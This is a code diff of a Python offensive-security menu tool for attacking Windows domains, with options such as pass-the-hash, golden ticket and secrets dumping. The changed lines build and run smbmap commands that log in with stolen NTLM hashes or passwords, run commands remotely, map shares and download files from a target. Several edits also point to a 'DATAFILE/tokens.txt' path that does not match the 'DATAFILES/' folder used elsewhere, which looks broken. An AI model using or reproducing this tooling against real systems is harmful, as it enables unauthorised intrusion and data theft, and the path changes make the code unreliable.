@@ -108,7 +108,7 @@ def testThree():
       print("[-] USERNAME has not been specified...")
       return 1
    if SID[:5] == "EMPTY":
-      print("[-] User SID has not been specified...")
+      print("[-] Domain SID has not been specified...")
       return 1
    return 0
 
@@ -427,7 +427,7 @@ def options():
    print('\u2551' + "(4) Re/Set WEB ADDRESS (14) Recon DNS SERVER   (24) DcomExe (34) List EndPoints (44) KerbASREPRoast (54) SecretsDump (64) Editor PASS (74) Hydra TOM  (84) NetCat  " + '\u2551')
    print('\u2551' + "(5) Re/Set USER NAME   (15) Dump DNS SERVER    (25) PsExec  (35) Rpc Client     (45) PASSWORD2HASH  (55) CrackMapExe (65) Editor HASH (75) MSF TOMCAT (85) SQSH    " + '\u2551')
    print('\u2551' + "(6) Re/Set PASS WORD   (16) NMap LIVE PORTS    (26) SmbExec (36) Smb Client     (46) Pass the HASH  (56) PSExec HASH (66) Editor HOST (76) RemoteSync (86) MSSQL   " + '\u2551')
-   print('\u2551' + "(7) Re/Set NTLM HASH   (17) NMap PORT Services (27) WmiExec (37) SmbMap SHARES  (47) PasstheTicket  (57) SmbExecHASH (67) GoPhishing  (77) RSyncDumpS (87) MySQL   " + '\u2551')
+   print('\u2551' + "(7) Re/Set NTLM HASH   (17) NMap PORT Services (27) WmiExec (37) SmbMap SHARE   (47) PasstheTicket  (57) SmbExecHASH (67) GoPhishing  (77) RSyncDumpS (87) MySQL   " + '\u2551')
    print('\u2551' + "(8) Re/Set DOMAIN NAME (18) NMap SubDOMAINS    (28) IfMap   (38) SmbCopy Files  (48) Silver Ticket  (58) WmiExecHASH (68) GoBuster    (78) RDeskTop   (88) WinRm   " + '\u2551')
    print('\u2551' + "(9) Re/Set DOMAIN SID  (19) NMap SERVER TIME   (29) OpDump  (39) SmbMount SHARE (49) Golden Ticket  (59) NTDSDecrypt (69) Nikto Scan  (79) XDesktop   (89) Exit    " + '\u2551')
    print('\u255A' + ('\u2550')*163 + '\u255D')
@@ -502,9 +502,9 @@ else:
    
 if not os.path.exists("DATAFILES/tokens.txt"):
    command("touch DATAFILES/tokens.txt")
-   print("[+] File tokens.txt created...")
+   print("[+] File DATAFILE/tokens.txt created...")
 else:
-   print("[-] File tokens.txt already exists...")
+   print("[-] File DATAFILE/tokens.txt already exists...")
 
 SKEW = 0         							# TIME SKEW
 DOMC = 0								# DOMAIN COUNTER
@@ -1502,6 +1502,7 @@ while True:
 # Version : Al@N_3r@dL3y                                                             
 # Details : Menu option selected - ./samrdump.py DOMAIN/USER:PASSWORD@IP.
 # Modified: N/A
+# Status  : Need to re-script!!
 # -------------------------------------------------------------------------------------
 
    if selection =='32':
@@ -1538,8 +1539,8 @@ while True:
             command("touch DATAFILES/hashes.txt")
             
             
-            command("rm tokens.txt")
-            command("touch tokens.txt")      
+            command("rm DATAFILE/tokens.txt")
+            command("touch DATAFILE/tokens.txt")      
                           
             command("sed -i -n '/Found user: /p' users.tmp")
             command("cat users.tmp | sort > users2.tmp")
@@ -1688,26 +1689,26 @@ while True:
          if NTM[:5] != "EMPTY":
             print("[i] Using HASH value as password credential...")
             print("[*] Checking OS...")
-            command("smbmap -v --admin -u " + USR.rstrip(" ") + " -p :" + NTM.rstrip(" ") + " -d " + DOM.rstrip(" ") + " -H " + TIP.rstrip(" "))      
+            command("smbmap -v --admin -u " + USR.rstrip(" ") + " -p :" + NTM.rstrip(" ") + " -d " + DOM.rstrip(" ") + " -H " + TIP.rstrip(" ") + " -R " + TSH.rstrip(" "))      
          else:
             print("[*] Checking OS...")
-            command("smbmap -v --admin -u " + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") + "' -d " + DOM.rstrip(" ") + " -H " + TIP.rstrip(" "))
+            command("smbmap -v --admin -u " + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") + "' -d " + DOM.rstrip(" ") + " -H " + TIP.rstrip(" ") + " -R " + TSH.rstrip(" "))
             
          if NTM[:5] != "EMPTY":
             print("[i] Using HASH value as password credential...")
             print("[*] Checking command privilege...")
-            command("smbmap -x whoami -u " + USR.rstrip(" ") + " -p :" + NTM.rstrip(" ") + " -d " + DOM.rstrip(" ") + " -H " + TIP.rstrip(" "))      
+            command("smbmap -x whoami -u " + USR.rstrip(" ") + " -p :" + NTM.rstrip(" ") + " -d " + DOM.rstrip(" ") + " -H " + TIP.rstrip(" ") + " -R " + TSH.rstrip(" "))      
          else:
             print("[*] Checking command privilege...")
-            command("smbmap -x whoami -u " + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") + "' -d " + DOM.rstrip(" ") + " -H " + TIP.rstrip(" "))
+            command("smbmap -x whoami -u " + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") + "' -d " + DOM.rstrip(" ") + " -H " + TIP.rstrip(" ") + " -R " + TSH.rstrip(" "))
       
          if NTM[:5] != "EMPTY":
             print("[i] Using HASH value as password credential...")
             print("[*] Mapping Shares...")
-            command("smbmap -u " + USR.rstrip(" ") + " -p :" + NTM.rstrip(" ") + " -d " + DOM.rstrip(" ") + " -H " + TIP.rstrip(" ") + " --depth 15-R")      
+            command("smbmap -u " + USR.rstrip(" ") + " -p :" + NTM.rstrip(" ") + " -d " + DOM.rstrip(" ") + " -H " + TIP.rstrip(" ")  + " -R " + TSH.rstrip(" ") + " --depth 15")      
          else:
             print("[*] Mapping Shares...")
-            command("smbmap -u " + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") + "' -d " + DOM.rstrip(" ") + " -H " + TIP.rstrip(" ") + " --depth 15 -R")
+            command("smbmap -u " + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") + "' -d " + DOM.rstrip(" ") + " -H " + TIP.rstrip(" ")  + " -R " + TSH.rstrip(" ") + " --depth 15")
       prompt()
       
 # ------------------------------------------------------------------------------------- 
@@ -1732,11 +1733,11 @@ while True:
          if NTM[:5] != "EMPTY":
             print("[i] Using HASH value as password credential...")
             print("[+] Downloading any found files...")
-            command("smbmap -u " + USR.rstrip(" ") + " -p :" + NTM.rstrip(" ") + " -d " + DOM.rstrip(" ") + " -H " + TIP.rstrip(" ") + " -A " + exTensions + " -s " + TSH.rstrip(" ") + " --depth 15 -R")
+            command("smbmap -u " + USR.rstrip(" ") + " -p :" + NTM.rstrip(" ") + " -d " + DOM.rstrip(" ") + " -H " + TIP.rstrip(" ") + " -A " + exTensions + " -R " + TSH.rstrip(" ") + " --depth 15")
 
          else:
             print("[+] Downloading any found files...")
-            command("smbmap -u " + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") + "' -d " + DOM.rstrip(" ") + " -H " + TIP.rstrip(" ") + " -A " + exTensions + " -s " + TSH.rstrip(" ") + " --depth 15 -R") 
+            command("smbmap -u " + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") + "' -d " + DOM.rstrip(" ") + " -H " + TIP.rstrip(" ") + " -A " + exTensions + " -R " + TSH.rstrip(" ") + " --depth 15") 
       prompt()
 
 # ------------------------------------------------------------------------------------- 
@@ -1826,9 +1827,10 @@ while True:
 
             with open("DATAFILES/usernames.txt", "w") as write1, open("DATAFILES/hashes.txt", "w") as write2, open("DATAFILES/tokens.txt", "w") as write3:
                for x in range(0, maximum):
-                  write1.write(USER[x].rstrip(" ") + "\n")
-                  write2.write(HASH[x].rstrip(" ") + "\n")
-                  write3.write(VALD[x].rstrip(" ") + "\n")
+                  if USER[x] != "":
+                     write1.write(USER[x].rstrip(" ") + "\n")
+                     write2.write(HASH[x].rstrip(" ") + "\n")
+                     write3.write(VALD[x].rstrip(" ") + "\n")
       else:
          print("[-] No usernames where accepted by the remote server...")
       prompt()
@@ -2238,8 +2240,8 @@ while True:
                
             command("rm DATAFILES/usernames.txt")
             command("rm DATAFILES/hashes.txt")
-            command("rm tokens.txt")
-            command("touch tokens.txt")
+            command("rm DATAFILE/tokens.txt")
+            command("touch DATAFILE/tokens.txt")
              
             for x in range(0, count):
                data = linecache.getline("ssecrets.tmp", x + 1)               
